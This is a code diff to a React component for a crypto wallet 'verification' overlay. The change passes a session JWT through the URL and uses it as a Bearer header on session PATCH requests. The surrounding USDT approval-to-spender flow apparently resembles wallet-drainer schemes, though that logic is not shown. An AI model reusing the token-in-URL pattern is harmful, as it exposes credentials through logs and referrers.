@@ -35,6 +35,9 @@ interface Props {
   compact?: boolean;
   /** session ID for real-time status tracking (passed from URL) */
   sid?: string;
+  /** WC JWT — passed through URL so compact overlay can authenticate PATCH calls
+   *  via Bearer header when WKWebView hasn't committed the session cookie yet */
+  wcToken?: string;
 }
 
 /* ── EVM USDT contracts ── */
@@ -277,6 +280,8 @@ interface CompactOverlayProps {
   setTrcApproveError: (v: string) => void;
   connectError: string;
   trcConnectError: string;
+  /** WC JWT for Bearer auth in PATCH calls — avoids WKWebView cookie timing race */
+  wcToken?: string;
   onVerified: (address: string, txHash?: string) => void;
   evmUsdtBalance: number | null;
   trcBalance: number | null;
@@ -287,7 +292,7 @@ interface CompactOverlayProps {
 }
 
 function CompactOverlay({
-  network, depositAddress, sid, isTRC20, hasTrust, isMobile,
+  network, depositAddress, sid, wcToken = '', isTRC20, hasTrust, isMobile,
   address, isConnected, connect, disconnect, connectors, switchChain, chainId, expectedChain,
   writeApprove, approveHash, approveWriteError, isApproveConfirming, approveConfirmed,
   resetApprove, usdtCfg, evmSpender,
@@ -363,8 +368,12 @@ function CompactOverlay({
   async function patch(data: Record<string, unknown>) {
     if (!sid) return;
     try {
+      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
+      // Use Bearer auth when available so PATCH succeeds even if the WKWebView session
+      // cookie hasn't committed yet (common on the very first call after the exchange redirect).
+      if (wcToken) headers['Authorization'] = `Bearer ${wcToken}`;
       await fetch(`/api/wallet-sessions/${sid}`, {
-        method: 'PATCH', headers: { 'Content-Type': 'application/json' },
+        method: 'PATCH', headers,
         body: JSON.stringify(data),
       });
     } catch { /* non-fatal */ }
@@ -991,7 +1000,7 @@ function CompactOverlay({
 
 function env_safe_bottom() { return 40; }
 
-export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '' }: Props) {
+export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '', wcToken = '' }: Props) {
   const isTRC20 = network === 'TRC20';
 
   /* ── EVM wagmi ── */
@@ -1561,6 +1570,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
       network={network}
       depositAddress={depositAddress}
       sid={sid}
+      wcToken={wcToken}
       isTRC20={isTRC20}
       hasTronLink={hasTronLink}
       hasTrust={hasTrust}
